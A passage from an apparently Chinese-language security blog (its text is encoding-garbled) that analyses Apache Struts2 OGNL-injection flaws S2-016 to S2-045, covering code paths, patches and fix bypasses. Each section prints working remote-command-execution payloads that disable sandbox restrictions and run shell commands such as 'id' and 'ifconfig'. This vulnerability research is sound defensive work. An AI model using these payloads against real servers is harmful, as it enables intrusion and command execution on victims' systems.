<p>S2-016é—®é¢˜å‡ºåœ¨å¤„ç†é»˜è®¤çš„<code>action:xxx</code>æˆ–<code>redirect:xxx</code>ï¼Œåé¢è·Ÿçš„<code>xxx</code>ä¸ºOGNLè¡¨è¾¾å¼ï¼ŒStruts2é»˜è®¤å°†ç”¨<code>ServletRedirectResult</code>æ¥å¤„ç†è·³è½¬é—®é¢˜ï¼Œè¿™é‡Œè·ŸS2-012ä¸€æ ·ï¼Œåªæ˜¯è¿™é‡Œçš„è·³è½¬è®¾ç½®åœ¨urlé‡Œé¢</p>
<p>æ‰§è¡Œé“¾è·¯è·ŸS2-012ä¸€æ ·ï¼Œä¸ä½œåˆ†æäº†</p>
<h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%&#123;#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä¿®å¤-7"><a href="#ä¿®å¤-7" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p><code>org.apache.struts2.dispatcher.mapper.DefaultActionMapper</code>é»˜è®¤çš„<code>redirect/redirectaction</code>ç›´æ¥è¢«åˆ é™¤äº†</p>
<p><img src="/assets/talk_about_struts2/image-20200515154730941.png" alt="image-20200515154730941"></p>
<p><code>action:</code>éƒ¨åˆ†å› ä¸ºS2-015çš„å…³ç³»ï¼Œé™åˆ¶äº†actionå</p>
<p><img src="/assets/talk_about_struts2/image-20200515154855569.png" alt="image-20200515154855569"></p>
<p>å·²ç»ä¸æ„æˆå¨èƒäº†</p>
<h2 id="11-S2-019"><a href="#11-S2-019" class="headerlink" title="11. S2-019"></a>11. S2-019</h2><p>èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.15.1</p>
<p>S2-019è·ŸS2-008çš„ç¬¬äºŒä¸ªæ¼æ´ä¸€æ ·ï¼Œå½“å¼€å¯å¼€å‘è€…æ¨¡å¼æ—¶ï¼Œå…è®¸ä½¿ç”¨commandçš„æ¨¡å¼æ¥æ‰§è¡ŒOGNLè¡¨è¾¾å¼</p>
<p>å…·ä½“çœ‹S2-008</p>
<h3 id="POC-7"><a href="#POC-7" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23m=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close())</span><br></pre></td></tr></table></figure>
<h3 id="ä¿®å¤-8"><a href="#ä¿®å¤-8" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>è¿™é‡Œåé¢çš„å‡ ä¸ªç‰ˆæœ¬éƒ½æ˜¯å…è®¸æ‰§è¡Œçš„ï¼Œå¼€å‘è€…æ¨¡å¼ä¸‹çš„commandå¹¶æ²¡æœ‰è¢«å–æ¶ˆæ‰ï¼Œæ‰€ä»¥å¦‚æœåœ¨çº¿ä¸Šç¯å¢ƒç¢°åˆ°debugæ¨¡å¼ï¼Œé‚£å°±å¯ä»¥å°è¯•ä¸€ä¸‹OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ</p>
<p>ä½†æ˜¯ç”±äºä»struts2 2.3.20ä¹‹åå¼•å…¥äº†é»‘åå•æ¨¡å¼ï¼ˆexcludedClasses, excludedPackageNames å’Œ excludedPackageNamePatternsï¼‰ï¼Œå¹¶ä¸”ä½¿ç”¨æ„é€ å‡½æ•°çš„æ–¹å¼ä¹Ÿå¤±æ•ˆäº†</p>
<p>è¿™é‡Œå‰è¾ˆä»¬ç”¨åˆ°äº†å°†SecurityMemberAccessåˆå§‹åŒ–çš„æ–¹å¼æ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼ŒåŸç†å¯ä»¥å¥½å¥½çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://paper.seebug.org/794/#33-struts-2329ã€‚" target="_blank" rel="noopener">https://paper.seebug.org/794/#33-struts-2329ã€‚</a></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))</span><br></pre></td></tr></table></figure>
<p>åç»­è¿˜æœ‰ä¸€äº›ç»•è¿‡ï¼Œåé¢å†è®²</p>
<h2 id="12-S2-029-S2-036"><a href="#12-S2-029-S2-036" class="headerlink" title="12. S2-029/S2-036"></a>12. S2-029/S2-036</h2><p>S2-029å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)</p>
<p>S2-036å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.28.1 ï¼ˆè·ŸS2-029ä¸€æ ·ï¼Œä¸»è¦åœ¨ä¿®å¤çš„åœ°æ–¹è®²ï¼‰</p>
<p>åŸç†è·ŸS2-001å·®ä¸å¤šï¼ŒS2-029çš„è§¦å‘éœ€è¦jspç”¨åˆ°æ ‡ç­¾<code>&lt;s:textfield name=&quot;%{xxxx}&quot;&gt;&lt;/s:textfield&gt;</code>ï¼Œnameå±æ€§ä¸­ç”±ä¸€OGNLè¡¨è¾¾å¼è§£æè€Œå¾—ï¼Œæ„å‘³ç€ç”Ÿæˆçš„inputæ ‡ç­¾çš„nameå±æ€§æ˜¯åŠ¨æ€è®¡ç®—è€Œå¾—çš„ï¼Œæ¯”å¦‚?xxxx=usernameï¼Œæ­¤æ—¶è§£æå¾—åˆ°çš„input.nameä¸ºusernameã€‚è¿™å…¶ä¸­æ‰§è¡Œäº†<code>%{xxxx}</code>ï¼Œè·å¾—xxxxçš„å†…å®¹ã€‚è€ŒS2-001çš„ä¿®å¤ä¸»è¦è§£å†³çš„æ˜¯é€’å½’è®¡ç®—OGNLè¡¨è¾¾å¼çš„é—®é¢˜ï¼ŒS2-029å°±æ˜¯åœ¨è¿›å…¥translateVariablesä¹‹å‰å°±å°†ç¬¬ä¸€å±‚çš„OGNLè¡¨è¾¾å¼æ‰§è¡Œå®Œæ¯•</p>
<p><img src="/assets/talk_about_struts2/image-20200519143433067.png" alt="image-20200519143433067"></p>
<p>ç›´æ¥çœ‹<code>UIBean.evaluateParams</code></p>
<p>é¦–å…ˆè®¡ç®—<code>%{message}</code>åˆ°æˆ‘ä»¬ä¼ å…¥çš„OGNLè¡¨è¾¾å¼</p>
<p><img src="/assets/talk_about_struts2/image-20200519144431546.png" alt="image-20200519144431546"></p>
<p>åç»­ä¼šåœ¨æˆ‘ä»¬ä¼ å…¥çš„OGNLè¡¨è¾¾å¼æ‹¬ä¸Š<code>%{xxx}</code></p>
<p><img src="/assets/talk_about_struts2/image-20200519144525695.png" alt="image-20200519144525695"></p>
<p><img src="/assets/talk_about_struts2/image-20200519144603429.png" alt="image-20200519144603429"></p>
<p>æ­¤æ—¶å†ä¼ å…¥åˆ°<code>findValue</code>å°±æ˜¯ç¬¬äºŒå±‚çš„OGNLè¡¨è¾¾å¼ï¼Œåç»­è·ŸS2-001ä¸€æ ·ï¼Œåªéœ€è¦æ‰§è¡Œä¸€æ¬¡OGNLè¡¨è¾¾å¼è®¡ç®—å³å¯</p>
<h3 id="POC-8"><a href="#POC-8" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// éœ€è¦å…ˆåˆå§‹åŒ–SecurityMemberAccessï¼Œä¸ç„¶æ— æ³•æ‰§è¡Œ</span></span><br><span class="line">?message=((%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS).(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open+/System/Applications/Calculator.app'</span>)))</span><br><span class="line"><span class="comment">// å›æ˜¾POC</span></span><br><span class="line">?message=(%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>)),%<span class="number">23</span>q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString</span>(%<span class="number">23</span>ret.getInputStream())</span><br><span class="line"> <span class="comment">// S2-036</span></span><br><span class="line"> ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream()))</span><br></pre></td></tr></table></figure>
<h3 id="ä¿®å¤S2-029"><a href="#ä¿®å¤S2-029" class="headerlink" title="ä¿®å¤S2-029"></a>ä¿®å¤S2-029</h3><p><code>com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute</code></p>
<p><img src="/assets/talk_about_struts2/image-20200519152941105.png" alt="image-20200519152941105"></p>
<p>åœ¨è®¡ç®—è¡¨è¾¾å¼ä¹‹å‰ï¼ŒéªŒè¯æ˜¯å¦å¯ä»¥æ‰§è¡Œ</p>
<p><img src="/assets/talk_about_struts2/image-20200519153530702.png" alt="image-20200519153530702"></p>
<p><img src="/assets/talk_about_struts2/image-20200519153555655.png" alt="image-20200519153555655"></p>
<p>è¿™é‡Œå…ˆçœ‹<code>node.isEvalChain</code>ï¼Œè¿™é‡Œæ˜¯å¯¹S2-009åšçš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯å½“å‡ºç°<code>((1)(2))</code>æ—¶ï¼Œä¼šè§£æå‡º<code>ASTEval</code>èŠ‚ç‚¹ï¼Œè€Œ<code>ASTEval</code>å¯¹è±¡çš„<code>isEvalChain</code>å‡½æ•°ç›´æ¥è¿”å›trueï¼Œä¹Ÿå°±ä½¿å¾—<code>(1)(2)</code>æ— æ³•æ‰§è¡Œ</p>
<p>å…¶æ¬¡å†æ¥çœ‹<code>node.isSequence</code>ï¼Œè¿™é‡Œæ˜¯å¯¹å½¢å¦‚<code>(xxx1,xxx2,xxx3)</code>çš„OGNLè¡¨è¾¾å¼çš„é™åˆ¶ï¼Œä»–å°†è§£æå‡º<code>ASTSequence</code>èŠ‚ç‚¹ï¼Œ<code>ASTSequence</code>å¯¹è±¡çš„<code>isSequence</code>ç›´æ¥è¿”å›trueï¼Œä¹Ÿå°±é™åˆ¶äº†è¿™ç§è¡¨è¾¾å¼çš„æ‰§è¡Œ</p>
<p>ç„¶åæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ï¼Œå¯¹äºå½¢å¦‚<code>((xxx1).(xxx2).(xxx3))</code>çš„OGNLè¡¨è¾¾å¼ï¼Œè¿™æ˜¯ä¸€ç§<code>ASTChain</code>ï¼Œä½†å…¶ä¸­å¹¶ä¸ä¼šè§£æå‡º<code>ASTEval</code></p>
<h3 id="ä¿®å¤S2-036"><a href="#ä¿®å¤S2-036" class="headerlink" title="ä¿®å¤S2-036"></a>ä¿®å¤S2-036</h3><p>çœ‹å‰é¢çš„åˆ†æï¼ŒçŸ¥é“å¯ä»¥å°†S2-029çš„ä¿®å¤bypassæ‰ï¼Œæ‰€ä»¥è¿æ¥äº†S2-036çš„ä¿®å¤</p>
<p><img src="/assets/talk_about_struts2/image-20200519165840354.png" alt="image-20200519165840354"></p>
<p>è¿™é‡Œç›´æ¥å°†ä¸¤æ¬¡æ‰§è¡ŒOGNLè¡¨è¾¾å¼çš„æ–¹å¼ç»™æ”¹æˆäº†ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¹Ÿå°±æ²¡æ³•å†ç»§ç»­åšæ–‡ç« äº†</p>
<h2 id="13-S2-032-S2-033-S2-037"><a href="#13-S2-032-S2-033-S2-037" class="headerlink" title="13. S2-032/S2-033/S2-037"></a>13. S2-032/S2-033/S2-037</h2><p>å½±å“èŒƒå›´ï¼šStruts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
<p>è¿™é‡Œæˆ‘çš„ç¯å¢ƒæ­çš„æ˜¯rest-showcaseçš„ï¼Œæ‰€ä»¥ä¸»è¦è®²S2-033ï¼ˆS2-032çš„åŸç†è·Ÿä»–å·®ä¸å¤šï¼Œåªæ˜¯è§¦å‘å˜æˆäº†<code>method:#_xxxx</code>)</p>
<p>rest-pluginæ”¯æŒè§£æ<code>xxx!method</code>çš„è°ƒç”¨</p>
<p><code>org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation</code>è§£æ<code>name!method</code>ï¼Œå¹¶å¯¹å½“å‰çš„<code>restactionmapper</code>è®¾ç½®å¥½åç»­è¦è°ƒç”¨method</p>
<p><img src="/assets/talk_about_struts2/image-20200520223124404.png" alt="image-20200520223124404"></p>
<p>åœ¨struts2çš„æ‰€æœ‰intercepterè°ƒç”¨å®Œæ¯•åï¼Œä¼šå»è°ƒç”¨DefaultActionInvocationçš„invokeActionOnlyå‡½æ•°</p>
<p><img src="/assets/talk_about_struts2/image-20200520223603177.png" alt="image-20200520223603177"></p>
<p>è€ŒinvokeActionOnlyä¼šå»è°ƒç”¨<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code></p>
<p><img src="/assets/talk_about_struts2/image-20200520223738228.png" alt="image-20200520223738228"></p>
<p>åœ¨è¿™ä¸ªå‡½æ•°é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–å°†å‰é¢å¯æ§çš„methodNameæ”¾è¿›äº†<code>ognlUtil.getValue</code>ï¼Œå¯¼è‡´äº†OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å‰é¢è°ƒç”¨çš„interceptoré‡Œä¸èƒ½å‡ºç°å¼‚å¸¸çš„æƒ…å†µï¼Œä¼šå¯¼è‡´æ— æ³•æ‰§è¡Œåˆ°OGNLè¡¨è¾¾å¼æ‰§è¡Œçš„ä½ç½®ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½åœ¨å¼€å¯<code>devMode</code>çš„æƒ…å†µä¸‹è¿›è¡Œåˆ©ç”¨çš„åŸå› ã€‚</p>
<h3 id="POC-9"><a href="#POC-9" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// S2-037</span></span><br><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ç”¨<code>#parameters.command[0]</code>çš„æ–¹å¼æ¥è·å–ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç”Ÿæˆ<code>DefaultActionProxy</code>çš„æ—¶å€™å¯¹methodNameåšäº†è½¬ä¹‰å¤„ç†ï¼Œä¸ºäº†é¿å…è½¬ä¹‰ç ´åOGNLè¡¨è¾¾å¼ï¼Œç”¨<code>#parameters</code>çš„æ–¹å¼ä»å‚æ•°ä¸­è·å–ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œåœ¨æœ€åè°ƒç”¨<code>ognlUtil.getValue</code>æ—¶ï¼Œåœ¨methodNameåé¢æ‹¼æ¥äº†<code>()</code>ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™ä¸ª<code>()</code>åšå¤„ç†ï¼Œæ¯”å¦‚è¿™é‡Œçš„POCåšçš„å¤„ç†æ˜¯<code>#xx.toString</code>å»åƒæ‰è¿™ä¸ª<code>()</code></p>
<h3 id="S2-032-S2-033ä¿®å¤"><a href="#S2-032-S2-033ä¿®å¤" class="headerlink" title="S2-032/S2-033ä¿®å¤"></a>S2-032/S2-033ä¿®å¤</h3><p><img src="/assets/talk_about_struts2/image-20200520230704180.png" alt="image-20200520230704180"></p>
<p><code>xwork-core:2.3.28.1</code>åœ¨<code>OgnlUtil.isEvalExpression</code>å¢åŠ äº†<code>isSequence</code>çš„åˆ¤æ–­</p>
<p>è¿™é‡Œå‡ºç°äº†æ–°çš„ä¸€ç§åˆ©ç”¨æ–¹å¼<code>(1)?(2):(3)</code>ï¼Œè¿™ç§å½¢å¼çš„OGNLè¡¨è¾¾å¼å°†æœ‰<code>ASTTest</code>å¯¹è±¡æ¥å¤„ç†</p>
<p>è€Œ<code>isEvalChain()</code>å’Œ<code>isSequence()</code>é™åˆ¶çš„æ˜¯<code>ASTEval</code>å’Œ<code>ASTSequence</code>å¯¹è±¡ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å¯¹ASTTeståšé™åˆ¶ï¼Œå¹¶ä¸”ç”±äº<code>isSequence</code>å¹¶ä¸æ˜¯é€’å½’å»åˆ¤æ–­çš„ï¼Œæ‰€ä»¥åœ¨<code>ASTTest</code>çš„childrenèŠ‚ç‚¹ä¸Šå†å‡ºç°<code>ASTSequence</code>ä¹Ÿæ˜¯okçš„</p>
<p>æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºæ–°çš„POC</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json</span><br></pre></td></tr></table></figure>
<h3 id="S2-037ä¿®å¤"><a href="#S2-037ä¿®å¤" class="headerlink" title="S2-037ä¿®å¤"></a>S2-037ä¿®å¤</h3><p><img src="/assets/talk_about_struts2/image-20200520233839824.png" alt="image-20200520233839824"></p>
<p>åœ¨è§£æ<code>name!method</code>çš„åœ°æ–¹ï¼Œè°ƒç”¨äº†<code>cleanupActionName</code></p>
<p><img src="/assets/talk_about_struts2/image-20200520233957407.png" alt="image-20200520233957407"></p>
<p>ä½¿ç”¨äº†æ­£åˆ™ï¼Œé˜²æ­¢å‡ºç°<code>(#@)</code>ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå‡ºç°å°±æŠ¥é”™ï¼Œä¹Ÿå°±åˆ°ä¸äº†åç»­çš„OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ</p>
<p>å¹¶ä¸”åœ¨ç¦æ­¢çš„classåˆ—è¡¨é‡Œå¢åŠ äº†ä¸¤ä¸ª</p>
<p><img src="/assets/talk_about_struts2/image-20200520234647887.png" alt="image-20200520234647887"></p>
<p>ä½¿å¾—æˆ‘ä»¬ä¸èƒ½åœ¨ç”¨<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`æ¥ç»•è¿‡é™åˆ¶</p>
<h3 id="ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹"><a href="#ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹" class="headerlink" title="ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹"></a>ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹</h3><p>å‰é¢è¯´åˆ°è¿™3ä¸ªæ¼æ´éœ€è¦å¼€å¯DynamicMethodInvocationï¼Œå…¶å®ä¸å¼€å¯ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p>å‰é¢è¯´çš„å‡ ç§æ–¹æ³•éƒ½æ˜¯åœ¨å¤„ç†<code>name!method</code>è¿™ä¸ªæ ¼å¼ï¼Œrestå…¶å®è¿˜æ”¯æŒå¯¹<code>action/id/method</code>çš„è§£æ</p>
<p><img src="/assets/talk_about_struts2/image-20200521112254951.png" alt="image-20200521112254951"></p>
<p>æ‰€ä»¥æ”¹æ”¹POCå°±èƒ½é€šæ€rest-pluginäº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure>
<h2 id="14-S2-045-S2-046"><a href="#14-S2-045-S2-046" class="headerlink" title="14. S2-045/S2-046"></a>14. S2-045/S2-046</h2><p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
<p>S2-046åŸç†ä¸€æ ·ï¼Œè¿™é‡Œåªåˆ†æS2-045</p>
<p>è¿™é‡Œ2.3å’Œ2.5ç‰ˆæœ¬å˜åŒ–æ¯”è¾ƒå¤§ï¼Œè¿™é‡Œä»¥2.3.31çš„ä»£ç åˆ†æï¼Œçœ‹2.5çš„å¯ä»¥çœ‹<a href="https://paper.seebug.org/247/" target="_blank" rel="noopener">https://paper.seebug.org/247/</a></p>
<p>ä»struts2çš„å·¥ä½œæµç¨‹å›¾æ¥çœ‹ï¼Œæ‰€æœ‰çš„è¯·æ±‚åœ¨ç”ŸæˆActionProxyä¹‹å‰ï¼Œéƒ½ç”±FilterDispatcheræ¥å¤„ç†ï¼Œ2.3ç‰ˆæœ¬ç”¨çš„æ˜¯<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>ï¼Œè¿™é‡Œåœ¨è°ƒç”¨actionä¹‹å‰ä¼šå…ˆå°è£…requestã€‚</p>
<p>çœ‹çœ‹è°ƒç”¨æ ˆ</p>
<p><img src="/assets/talk_about_struts2/image-20200521154143972.png" alt="image-20200521154143972"></p>
<p>å°è£…å®é™…ç”±<code>org.apache.struts2.dispatcher.Dispatcher#wrapRequest</code>å¤„ç†</p>
<p><img src="/assets/talk_about_struts2/image-20200521154319856.png" alt="image-20200521154319856"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåœ¨å¤„ç†<code>Content-Type: multipart/form-data</code>ç±»å‹æ—¶ï¼Œä¼šç”Ÿæˆ<code>org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper</code>å¤„ç†ï¼ŒS2-045å°±æ˜¯å‡ºé—®é¢˜åœ¨è¿™é‡Œ</p>
<p><img src="/assets/talk_about_struts2/image-20200521154524558.png" alt="image-20200521154524558"></p>
<p>åœ¨ç”¨<code>JakartaMultiPartRequest</code>è§£ærequeståŒ…æ—¶ï¼Œè°ƒç”¨<code>org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl</code>æ¥æ£€æŸ¥Content-Typeçš„å†…å®¹ï¼Œéœ€è¦ç”±multipart/å¼€å¤´æ‰è¡Œï¼Œä¸ç„¶å°±æ˜¯æŠ¥é”™å¹¶å°†å…·ä½“çš„contentTypeå†…å®¹å†™åˆ°å¼‚å¸¸é‡Œ</p>
<p><img src="/assets/talk_about_struts2/image-20200521155036903.png" alt="image-20200521155036903"></p>
<p>è¿™é‡Œæˆ‘ä»¬çš„å¯æ§æ•°æ®å°±åˆ°äº†å¼‚å¸¸ä¸Šï¼Œå°±çœ‹struts2æ˜¯æ€ä¹ˆå¤„ç†å¼‚å¸¸äº†</p>
<p><code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse</code></p>
<p><img src="/assets/talk_about_struts2/image-20200521155309089.png" alt="image-20200521155309089"></p>
<p><img src="/assets/talk_about_struts2/image-20200521155346720.png" alt="image-20200521155346720"></p>
<p>å¯æ§å†…å®¹ä¼ å…¥äº†<code>com.opensymphony.xwork2.util.LocalizedTextUtil#findText</code></p>
<p><img src="/assets/talk_about_struts2/image-20200521155451100.png" alt="image-20200521155451100"></p>
<p><img src="/assets/talk_about_struts2/image-20200521155901705.png" alt="image-20200521155901705"></p>
<p>å½“å‰éƒ½æ²¡ç”Ÿæˆé”™è¯¯ä¿¡æ¯æ—¶ï¼Œå°†è·å–é»˜è®¤çš„message</p>
<p><img src="/assets/talk_about_struts2/image-20200521155825583.png" alt="image-20200521155825583"></p>
<p>è¿™é‡Œåˆ°äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„<code>TextParseUtil.translateVariables</code>å‡½æ•°ï¼Œä»–åç»­ä¼šå¤„ç†è®¡ç®—OGNLè¡¨è¾¾å¼</p>
<p>ç®€å•æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹ä»æŠ¥é”™å¼€å§‹å­˜å…¥OGNLè¡¨è¾¾å¼ï¼Œå†ç”Ÿæˆé”™è¯¯ä¿¡æ¯çš„æ—¶å€™è®¡ç®—äº†OGNLè¡¨è¾¾å¼</p>
<p>åˆ°äº†è¿™é‡Œæ‰§è¡Œå¯æ§çš„OGNLè¡¨è¾¾å¼æ˜¯ç¬¬ä¸€æ­¥ï¼Œå› ä¸º2.3.29å¢åŠ äº†å¯¹<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`çš„é™åˆ¶</p>
<p>éœ€è¦ä¸€ç§æ–°çš„æ€è·¯æ¥ç»•è¿‡ï¼ŒS2-045çš„POCå°±ç»™æˆ‘ä»¬æä¾›è¿™æ ·ä¸€ä¸ªæ€è·¯</p>
<h3 id="POC-10"><a href="#POC-10" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">(#_='multipart/form-data').</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class="line">(#_memberAccess?(#_memberAccess=#dm):</span><br><span class="line">		(</span><br><span class="line">		(#container=#context['com.opensymphony.xwork2.ActionContext.container']).</span><br><span class="line">		(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class="line">		(#ognlUtil.getExcludedPackageNames().clear()).</span><br><span class="line">		(#ognlUtil.getExcludedClasses().clear()).</span><br><span class="line">		(#context.setMemberAccess(#dm)))).</span><br><span class="line">(#cmd='id').</span><br><span class="line">(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</span><br><span class="line">(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</span><br><span class="line">(#p=new java.lang.ProcessBuilder(#cmds)).</span><br><span class="line">(#p.redirectErrorStream(true)).</span><br><span class="line">(#process=#p.start()).</span><br><span class="line">(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class="line">(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).</span><br><span class="line">(#ros.flush())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
